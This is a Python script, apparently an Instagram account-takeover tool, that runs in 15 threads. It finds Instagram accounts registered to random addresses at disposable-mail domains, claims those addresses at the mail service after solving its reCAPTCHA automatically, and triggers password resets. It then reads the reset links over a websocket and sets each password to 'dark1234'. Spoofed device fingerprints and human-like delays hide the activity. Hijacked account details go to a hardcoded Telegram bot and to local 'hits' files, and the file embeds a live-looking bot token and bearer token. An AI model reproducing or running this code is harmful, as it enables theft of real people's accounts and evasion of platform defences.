import requests
import re
import base64
import time
import os
import threading
import random
from time import sleep
import httpx, uuid, time, random, string, uuid, user_agent
import websocket
import json
import datetime
import sys

bi, hit, be, dead, gi ,don= 0, 0, 0, 0, 0, 0
donr=0
J = '\x1b[2;36m'
N = '\x1b[1;37m'

doner=0
token= '8682452562:AAH7y8uj8QN7MnZTN-W8FVuZmCajN4sH2kI'
chid= '8651365784'


def get_instagram_info_api(username):
    url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
    
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.instagram.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "X-IG-App-ID": "936619743392459",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    try:
        with httpx.Client(http2=True, headers=headers, timeout=10.0) as session:
            response = session.get(url)
            if response.status_code == 200:
                data = response.json()
                user = data.get('data', {}).get('user', {})
                
                followers = user.get('edge_followed_by', {}).get('count', 0)
                following = user.get('edge_follow', {}).get('count', 0)
                full_name = user.get('full_name', 'N/A')
                is_private = user.get('is_private', False)
                is_verified = user.get('is_verified', False)
                posts_count = user.get('edge_owner_to_timeline_media', {}).get('count', 0)
                user_id = user.get('id', '0')
                biography = user.get('biography', 'N/A')
                is_professional = user.get('is_professional_account', False)
                category = user.get('category_name', 'N/A')
                email = user.get('business_email') or user.get('public_email') or 'N/A'
                phone = user.get('business_phone_number') or user.get('public_phone_number') or 'N/A'
                external_url = user.get('external_url', 'N/A')
                profile_pic = user.get('profile_pic_url', 'N/A')
                
                return {
                    'success': True,
                    'followers': followers,
                    'following': following,
                    'full_name': full_name,
                    'is_private': is_private,
                    'is_verified': is_verified,
                    'posts_count': posts_count,
                    'user_id': user_id,
                    'biography': biography,
                    'is_professional': is_professional,
                    'category': category,
                    'email': email,
                    'phone': phone,
                    'external_url': external_url,
                    'profile_pic': profile_pic,
                    'username': user.get('username', username)
                }
            else:
                return {'success': False, 'error': f'HTTP {response.status_code}'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def get_account_creation_date(username):
    try:
        user_id = get_user_id_from_instagram(username)
        if user_id == '0':
            return None

        url = "https://www.instagram.com/graphql/query/"
        
        headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://www.instagram.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "X-IG-App-ID": "936619743392459",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        variables = {
            "id": user_id,
            "first": 50  
        }
        
        params = {
            "query_hash": "e769aa130647d2354c40ea6a439bfc08",  
            "variables": json.dumps(variables)
        }
        
        response = requests.get(url, headers=headers, params=params, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            edges = data.get('data', {}).get('user', {}).get('edge_owner_to_timeline_media', {}).get('edges', [])
            
            if edges:
                oldest_post = edges[-1].get('node', {})
                taken_at = oldest_post.get('taken_at_timestamp')
                
                if taken_at:
                    creation_date = datetime.datetime.fromtimestamp(taken_at)
                    return creation_date.year
        
        return None
        
    except Exception as e:
        print(f"Error getting creation date: {e}")
        return None

def get_user_id_from_instagram(username):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-IG-App-ID': '936619743392459'
        }
        
        url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            user_id = data.get('data', {}).get('user', {}).get('id', '0')
            return user_id
        return '0'
    except:
        return '0'

def estimate_account_year(user_id, followers_count=0, posts_count=0):
    try:
        id_int = int(user_id)
        current_year = datetime.datetime.now().year

        if id_int < 1000000:
            base_year = 2010
        elif id_int < 10000000:
            base_year = 2011
        elif id_int < 100000000:
            base_year = 2012
        elif id_int < 500000000:
            base_year = 2013
        elif id_int < 1500000000:
            base_year = 2014
        elif id_int < 3000000000:
            base_year = 2015
        elif id_int < 5000000000:
            base_year = 2016
        elif id_int < 8000000000:
            base_year = 2017
        elif id_int < 12000000000:
            base_year = 2018
        elif id_int < 20000000000:
            base_year = 2019
        elif id_int < 30000000000:
            base_year = 2020
        elif id_int < 45000000000:
            base_year = 2021
        elif id_int < 65000000000:
            base_year = 2022
        elif id_int < 100000000000:
            base_year = 2023
        else:
            base_year = 2024

        if base_year > current_year:
            base_year = current_year

        if posts_count == 0:
            if base_year < current_year - 1:
                return current_year - 1
        elif posts_count < 5 and followers_count < 50:
            if base_year < current_year - 1:
                return current_year - 1
        
        return base_year
        
    except:
        return datetime.datetime.now().year

def get_followers_following(username):
    result = get_instagram_info_api(username)
    
    if result['success']:
        creation_year = get_account_creation_date(username)
        if creation_year:
            account_year = creation_year
        else:
            account_year = estimate_account_year(result['user_id'], result['followers'], result['posts_count'])
        
        return (
            result['followers'],
            result['following'],
            result['full_name'],
            result['is_private'],
            result['is_verified'],
            result['posts_count'],
            account_year,
            result
        )
    else:
        try:
            followers, following, full_name, is_private, is_verified, posts_count = get_user_info_from_instagram(username)
            user_id = get_user_id_from_instagram(username)
            account_year = estimate_account_year(user_id, followers, posts_count)
            return followers, following, full_name, is_private, is_verified, posts_count, account_year, None
        except:
            return 0, 0, 'N/A', False, False, 0, datetime.datetime.now().year, None

def get_user_info_from_instagram(username):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }
        
        url = f"https://www.instagram.com/{username}/"
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            content = response.text
            
            try:
                shared_data_match = re.search(r'window\._sharedData\s*=\s*({.*?});', content)
                if shared_data_match:
                    shared_data = json.loads(shared_data_match.group(1))
                    user_data = shared_data.get('entry_data', {}).get('ProfilePage', [{}])[0].get('graphql', {}).get('user', {})
                    
                    followers = user_data.get('edge_followed_by', {}).get('count', 0)
                    following = user_data.get('edge_follow', {}).get('count', 0)
                    full_name = user_data.get('full_name', '')
                    is_private = user_data.get('is_private', False)
                    is_verified = user_data.get('is_verified', False)
                    posts_count = user_data.get('edge_owner_to_timeline_media', {}).get('count', 0)
                    
                    return followers, following, full_name, is_private, is_verified, posts_count
            except:
                pass
            
            followers_match = re.search(r'"edge_followed_by":\s*{"count":\s*(\d+)}', content)
            following_match = re.search(r'"edge_follow":\s*{"count":\s*(\d+)}', content)
            fullname_match = re.search(r'"full_name":"([^"]+)"', content)
            private_match = re.search(r'"is_private":(true|false)', content)
            verified_match = re.search(r'"is_verified":(true|false)', content)
            posts_match = re.search(r'"edge_owner_to_timeline_media":{"count":(\d+)}', content)
            
            followers = int(followers_match.group(1)) if followers_match else 0
            following = int(following_match.group(1)) if following_match else 0
            full_name = fullname_match.group(1) if fullname_match else ''
            is_private = private_match.group(1) == 'true' if private_match else False
            is_verified = verified_match.group(1) == 'true' if verified_match else False
            posts_count = int(posts_match.group(1)) if posts_match else 0
                
        return followers, following, full_name, is_private, is_verified, posts_count
        
    except Exception as e:
        return 0, 0, '', False, False, 0


def banner():
    try:
        from cfonts import render
        WDEH = render('{END}', colors=['red', 'white'], align='center')
    except ImportError:
        pass
    print(WDEH)

def generate_device_info():
    devices = [
        {'android': '31/12', 'dpi': '480dpi', 'res': '1080x2400', 'brand': 'samsung', 'model': 'SM-G998B', 'cpu': 'qcom'},
        {'android': '33/13', 'dpi': '440dpi', 'res': '1080x2400', 'brand': 'google', 'model': 'Pixel-7', 'cpu': 'google'},
        {'android': '32/12L', 'dpi': '420dpi', 'res': '1080x2340', 'brand': 'oneplus', 'model': 'ONEPLUS-A6013', 'cpu': 'qcom'}
    ]
    device = random.choice(devices)
    ANDROID_ID = 'android-' + ''.join(random.choices(string.hexdigits.lower(), k=16))
    instagram_versions = ['285.0.0.0.107', '289.0.0.0.91', '291.0.0.0.119', '294.0.0.0.81']
    insta_version = random.choice(instagram_versions)
    USER_AGENT = f'Instagram {insta_version} Android ({device["android"]}; {device["dpi"]}; {device["res"]}; {device["brand"]}; {device["model"]}; {device["cpu"]}; en_US; {random.randint(300000000, 399999999)})'
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.datetime.now().timestamp())
    password_suffix = 'dark1234'
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:{password_suffix}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD, device

def make_headers(mid='', user_agent='', android_id=''):
    return {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Bloks-Version-Id': 'e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd',
        'X-Mid': mid,
        'User-Agent': user_agent,
        'X-IG-Device-ID': android_id,
        'X-IG-Android-ID': android_id.replace('android-', ''),
        'X-IG-App-ID': '567067343352427',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-FB-HTTP-Engine': 'Liger',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }

def id_user(user_id):
    time.sleep(random.uniform(1.0, 2.5))
    url = f'https://i.instagram.com/api/v1/users/{user_id}/info/'
    headers = {'User-Agent': 'Instagram 285.0.0.0.107 Android', 'X-IG-App-ID': '567067343352427'}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        username = r.json()['user']['username']
        return username
    except:
        return None

def simulate_human_delay():
    delays = [1.5, 2.0, 2.5, 3.0]
    time.sleep(random.choice(delays))

def generate_android_id():
    return 'android-' + ''.join(random.choices(string.hexdigits.lower(), k=16))

def generate_device_id():
    return str(uuid.uuid4())

def generate_family_device_id():
    return str(uuid.uuid4())

def generate_mid():
    first_char = random.choice(['a', 'b', 'c'])
    rest = ''.join(random.choices(string.ascii_letters + string.digits, k=30))
    return first_char + rest

def generate_user_agent():
    android_sdk = random.choice(['28', '29', '30', '31', '32', '33', '34'])
    android_ver = random.choice(['9', '10', '11', '12', '13', '14'])
    dpi = random.choice(['320', '360', '420', '480', '560', '640'])
    resolution = random.choice(['720x1280', '1080x1920', '1080x2094', '1080x2160', '1440x2560', '1440x3120'])
    manufacturer = random.choice(['samsung', 'Google', 'OnePlus', 'Xiaomi', 'Huawei', 'OPPO', 'vivo'])
    
    models = {
        'samsung': ['SM-G960U', 'SM-G973U', 'SM-N960U1', 'SM-A515F', 'SM-S908B'],
        'Google': ['Pixel 5', 'Pixel 6', 'Pixel 7', 'Pixel 8'],
        'OnePlus': ['ONEPLUS A5010', 'ONEPLUS A6013', 'CPH2551'],
        'Xiaomi': ['Mi 10', 'Mi 11', '23127PN0CG'],
        'Huawei': ['P30', 'P40', 'ELE-L29'],
        'OPPO': ['CPH2025', 'CPH2211'],
        'vivo': ['V2023', 'V2110']
    }
    model = random.choice(models.get(manufacturer, ['SM-N960U1']))
    
    codenames = {
        'samsung': ['starqlteue', 'beyond1q', 'crownqlteue', 'a51', 'b0q'],
        'Google': ['redfin', 'oriole', 'panther', 'cheetah', 'husky'],
        'OnePlus': ['dumpling', 'fajita', 'salami'],
        'Xiaomi': ['umi', 'venus', 'mondrian'],
        'Huawei': ['els', 'ana'],
        'OPPO': ['RMX3085'],
        'vivo': ['RMX3085']
    }
    codename = random.choice(codenames.get(manufacturer, ['crownqlteue']))
    chipset = random.choice(['qcom', 'exynos', 'mtk', 'kirin'])
    locale = 'ar_LY'
    build_number = 792127708
    
    return f'Instagram 398.0.0.45.77 Android ({android_sdk}/{android_ver}; {dpi}dpi; {resolution}; {manufacturer}; {model}; {codename}; {chipset}; {locale}; {build_number})'

def reset_instagram_password(reset_link):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD, device_info = generate_device_info()
        
        uidb36 = reset_link.split('uidb36=')[1].split('&token=')[0]
        token_param = reset_link.split('&token=')[1].split(':')[0]
        
        print(f'\n[+] Using Device: {device_info["brand"]} {device_info["model"]}')
        print(f'[+] Android ID: {ANDROID_ID}')
        
        simulate_human_delay()
        
        url = 'https://i.instagram.com/api/v1/accounts/password_reset/'
        data = {
            'source': 'one_click_login_email',
            'uidb36': uidb36,
            'device_id': ANDROID_ID,
            'token': token_param,
            'waterfall_id': WATERFALL_ID,
            'guid': str(uuid.uuid4()),
            'phone_id': str(uuid.uuid4()),
            '_uuid': str(uuid.uuid4()),
            '_csrftoken': 'missing'
        }
        
        headers = make_headers(user_agent=USER_AGENT, android_id=ANDROID_ID)
        r = requests.post(url, headers=headers, data=data, timeout=15)
        
        simulate_human_delay()
        
        if 'user_id' not in r.text:
            return {'success': False, 'error': f'Error in reset request: {r.text}'}
        
        mid = r.headers.get('Ig-Set-X-Mid')
        resp_json = r.json()
        user_id = resp_json['uri'].split('/')[3]
        print(f'[+] User ID: {user_id}')
        
        cni = resp_json.get('cni')
        nonce_code = resp_json.get('nonce_code')
        challenge_context = resp_json.get('challenge_context')
        
        simulate_human_delay()
        
        url2 = 'https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/'
        data2 = {
            'user_id': str(user_id),
            'cni': str(cni),
            'nonce_code': str(nonce_code),
            'bk_client_context': '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            'challenge_context': str(challenge_context),
            'bloks_versioning_id': 'e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd',
            'get_challenge': 'true'
        }
        
        r2 = requests.post(url2, headers=make_headers(mid=mid, user_agent=USER_AGENT, android_id=ANDROID_ID), data=data2, timeout=15)
        
        if r2.status_code != 200:
            return {'success': False, 'error': f'Challenge error: {r2.text}'}
        
        r2_text = r2.text
        
        try:
            challenge_context_final = r2_text.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]
        except:
            match = re.search(r'challenge_context["\']?\s*:\s*["\']([^"\']+)["\']', r2_text)
            if match:
                challenge_context_final = match.group(1)
            else:
                return {'success': False, 'error': 'Could not extract challenge context'}
        
        simulate_human_delay()
        
        data3 = {
            'is_caa': 'False',
            'source': '',
            'uidb36': '',
            'error_state': '',
            'afv': {'type_name': 'str', 'index': 0, 'state_id': 1048583541},
            'cni': str(cni),
            'token': '',
            'has_follow_up_screens': '0',
            'bk_client_context': {'bloks_version': 'e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd', 'styles_id': 'instagram'},
            'challenge_context': challenge_context_final,
            'bloks_versioning_id': 'e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd',
            'enc_new_password1': PASSWORD,
            'enc_new_password2': PASSWORD,
            '_uuid': str(uuid.uuid4()),
            '_csrftoken': 'missing'
        }
        
        final_response = requests.post(url2, headers=make_headers(mid=mid, user_agent=USER_AGENT, android_id=ANDROID_ID), data=data3, timeout=15)
        
        simulate_human_delay()
        
        if final_response.status_code == 200:
            new_password = PASSWORD.split(':')[-1]
            time.sleep(1)
            return {
                'success': True,
                'password': new_password,
                'user_id': user_id,
                'android_id': ANDROID_ID,
                'user_agent': USER_AGENT,
                'device_info': device_info
            }
        else:
            return {'success': False, 'error': f'Final step failed: {final_response.text}'}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

def send(eml):
    global don
    session = requests.Session()
    android_id = generate_android_id()
    device_id = generate_device_id()
    family_device_id = generate_family_device_id()
    mid = generate_mid()
    user_agent = generate_user_agent()
    
    headers = {
        'User-Agent': f'{user_agent}',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'accept-language': 'en-US',
        'ig-intended-user-id': '0',
        'x-bloks-is-layout-rtl': 'false',
        'x-bloks-version-id': 'b86f6fc6f8131e7f0d789ecd251bbf01896d7d103e6345b34d3e806663c0ff8b',
        'x-fb-friendly-name': 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
        'x-ig-android-id': android_id, 
        'x-ig-app-id': '567067343352427',
        'x-ig-app-locale': 'en_US',
        'x-ig-capabilities': '3brTv10=',
        'x-ig-connection-type': 'WIFI',
        'x-ig-device-id': device_id,  
        'x-ig-device-locale': 'ar_LY',
        'x-ig-family-device-id': family_device_id,  
        'x-ig-timezone-offset': '10800',
        'x-ig-www-claim': '0',
        'x-mid': mid,  
        'Connection': 'close',
    }
    
    params_text = '{"client_input_params":{"search_query":"' + eml + '","accounts_list":[{"uid":"61242848064","credential_type":"spc_local_auth","token":"BearerIGT:2:eyJkc191c2VyX2lkIjoiNjEyNDI4NDgwNjQiLCJzZXNzaW9uaWQiOiI2MTI0Mjg0ODA2NCUzQXBUNnh2TVhDUWJBQ3RrJTNBMjklM0FBWWprbUZENVNZLUFnQ3NvU3ZFbFZzaUtlOGN1RVVmN2lPcnE0ZDRnbmcifQ=="}],"android_build_type":"release"}}'
    
    data = {
        'params': params_text,
        'bk_client_context': '{"bloks_version":"b86f6fc6f8131e7f0d789ecd251bbf01896d7d103e6345b34d3e806663c0ff8b","styles_id":"instagram"}',
        'bloks_versioning_id': 'b86f6fc6f8131e7f0d789ecd251bbf01896d7d103e6345b34d3e806663c0ff8b',
    }
    try:
        response = session.post(
            'https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/',
            headers=headers,
            data=data,
            stream=True      
        ).text
        print('')
        hidden_email = None
        match = re.search(r'([a-zA-Z0-9]\*+[a-zA-Z0-9]@[a-zA-Z0-9]+\.[a-zA-Z]+)', response)
        if match:
            hidden_email = match.group(1)
        
        success = False
        
        if f"We sent a link to {eml}" in response:
        	don += 1
        elif 'Please try again.' in response and 'Sorry, something went wrong' in response:
        	print('turn on vpn :')
        else:
        	print('ops')
        
        return success, hidden_email, eml  
        
    except Exception as e:
        print(e)

def getu(eml, hash_val, ex):
    global donr,dead
    ws = websocket.WebSocket()
    ws.connect("wss://ws.checker.in:8443", header=[
        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
        "Origin: https://hi2.in"
    ])
    print(ws.recv())
    
    ws.send(f"{ex}-{eml}-{hash_val}")
    ws.send("ping")
    
    i=0
    reset_link = None
    username = None
    send(eml)
    
    while i <= 5:
        i += 1
        try:
            msg = ws.recv()
            print("Server:", msg[:200] + "..." if len(msg) > 200 else msg)
            
            if msg.startswith('{'):
                try:
                    data = json.loads(msg)
                    
                    if 'body' in data and 'text' in data['body']:
                        email_text = data['body']['text']
                        
                        reset_links = re.findall(r'https://instagram\.com/accounts/password/reset/confirm/[^\s"\'>]+', email_text)
                        
                        if reset_links:
                            reset_link = reset_links[-1]
                            print("\n" + "="*50)
                            print("reset link : ")
                            print(reset_link)
                        
                        username_match = re.search(r'Hi ([a-zA-Z0-9_]+),', email_text)
                        if username_match:
                            username = username_match.group(1)
                            print("\n user:")
                            print(username)
                            print("="*50)
                        
                        if reset_link and username:
                            result = reset_instagram_password(reset_link)
                            donr += 1

                            print(f"[+] Fetching account info for: {username}")
                            followers_count, following_count, full_name, is_private, is_verified, posts_count, account_year, additional_info = get_followers_following(username)
                            
                            
                            ff = f'''
✅ Instagram Account Reset Complete!

Email : {eml}
Username : {username}
New Password : dark1234
 Account Statistics:
Full Name: {full_name}
Followers: {followers_count:,}
Following: {following_count:,}
Posts: {posts_count}
Account Year: {account_year}
════════════════════════════════
 Profile: instagram.com/{username}
By eng : @FFNZZ && @eo_xr 
'''
                            
                            message = ff
                            url = f"https://api.telegram.org/bot{token}/sendMessage"
                            data = {
                                "chat_id": chid,
                                "text": message
                            }
                            response = requests.post(url, data=data)
                            with open('/storage/emulated/0/Hi2hits.txt', "a", encoding="utf-8") as f:
                                f.write(f"{eml} | {username} | dark1234 | followers:{followers_count} | year:{account_year}\n")
                            with open('/storage/emulated/0/Download/etc.txt', 'a', encoding='utf-8') as f:
                                	f.write(f"{eml}\n")
                            message = f"✅ Good Email: {eml}"
                            url = f"https://api.telegram.org/bot{token}/sendMessage"
                            requests.post(url, data={"chat_id": chid, "text": message})
                            print("[✓] Saved to Hi2hits.txt")
                            
                            ws.close()
                            return None, None
                            
                except json.JSONDecodeError:
                    pass
                    
        except Exception as e:
            print("❌ Closed:", e)
            break
    
    if i >= 5 and (not reset_link or not username):
        dead += 1
        print(f"\n[!] No reset link or username found after {i} attempts. Deleting email: {eml}")
        
    ws.close()
    return None, None

gm=0

def check_email(email): 
    global bi, hit, be, gm
    siteKey = '6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct'
    siteUrl = 'https://hi2.in/'
    userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'

    request_kwargs = {}
 
    site_html = requests.get(siteUrl, **request_kwargs).text

    try:
        renderUrl = re.findall(r'''"https://[^"]+\.js"''', site_html)[0].strip('"')
    except:
        renderUrl = 'https://www.google.com/recaptcha/api2/recaptcha__en.js'

    js = requests.get(renderUrl, **request_kwargs).text

    match = re.search(r"po\.src\s*=\s*'(https://[^']+)';", js)

    if match:
        v = match.group(1).split('/')[5]
        api = renderUrl.split('.js')[0]
        if 'api2' not in api and 'enterprise' not in api:
            api += '2'
    else:
        v = renderUrl.split('/')[5]
        api = 'https://www.google.com/recaptcha/api2'

    site = requests.get('https://www.google.com', **request_kwargs)
    cookies = site.cookies

    headers = {
        "accept": "/",
        "accept-language": "en-US,en;q=0.9",
        "origin": "https://www.google.com",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": userAgent
    }

    domain = siteUrl.split('/')[2]
    co = base64.b64encode((f'https://{domain}:443').encode()).decode().replace('=', '.')

    anchor_params = {
        'ar': '1',
        'k': siteKey,
        'co': co,
        'hl': 'en',
        'v': v,
        'size': 'invisible',
        'cb': 'abc123'
    }

    headers['referer'] = siteUrl

    anchor = requests.get(f'{api}/anchor', params=anchor_params, headers=headers, cookies=cookies, **request_kwargs).text
    recaptcha_token = anchor.split('recaptcha-token" value="')[1].split('"')[0]

    reload_headers = headers.copy()
    reload_headers.pop('content-type', None)

    reload_data = {
        'v': v,
        'co': co,
        'reason': 'q',
        'size': 'invisible',
        'hl': 'en',
        'k': siteKey,
        'c': recaptcha_token,
        'chr': '',
        'vh': '',
        'bg': ''
    }

    reload = requests.post(f'{api}/reload?k={siteKey}', data=reload_data, headers=reload_headers, cookies=cookies, **request_kwargs).text
    final_token = reload.split('"rresp","')[1].split('"')[0]

    prefix, domin = email.split('@')

    headers2 = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://hi2.in',
        'referer': 'https://hi2.in/',
        'user-agent': userAgent
    }

    data = {
        'domain': domin,
        'prefix': prefix,
        'recaptcha': final_token
    }

    rss = requests.post('https://hi2.in/api/custom', headers=headers2, data=data, **request_kwargs)
    rs = rss.json()
    print(rs)
    if "hash" in rss.text:
        eml = rs.get('email')
        hash_val = rs.get('hash')
        ex = rs.get('expiry')
        

        getu(eml, hash_val, ex)
        
        
        
        print(f"\n Good Email -: {eml}")
        
        gm += 1
          
        
    else:
        be += 1

print('''
1 - hi2.in
2- telemail.com
3 - random
''')
cl=int(input('choice :'))

def em(email):
    global bi, hit, be, dead, gi, donr, don, gm
    
    try:
        with httpx.Client(http2=True, timeout=30) as client:
            res = client.post(
                "https://i.instagram.com/api/v1/users/check_email/",
                data=f"email={email}",
                headers={
                    'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",
                    'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
                }
            ).json()
        
        if res.get('error_type') == 'email_is_taken':
            check_email(email)  
            gi += 1
            
        else:
            bi += 1
            
            print(f'''\033[1;32mhits : {donr} |\033[1;36mgood email : {gm} | \033[1;31mbad email : {be} |\033[1;33mbad ig : {bi} | \033[1;32mgood ig : {gi}  | \033[1;35mdead acc : {dead}\033[0m''')
            
    except Exception as e:
        print(f"خطأ: {e}")

def qq():
    ema=random.choice(['hi2.in','telegmail.com'])
    letters = "abcdefghijklmnopqrstwvwxyzuxyz"
    ail ="".join(random.choice(letters) for _ in range(1))
    cil="".join(random.choice(letters) for _ in range(6))
    if cl==1:
        email=cil+'@' + 'hi2.in'
    elif cl==2:
        email=cil+'@'+'telegmail.com'
    elif cl==3:
        email=cil+'@'+ema
    em(email)

def worker():
    while True:
        qq()

from concurrent.futures import ThreadPoolExecutor
threads_count = 15

with ThreadPoolExecutor(max_workers=threads_count) as executor:
    for _ in range(threads_count):
        executor.submit(worker)
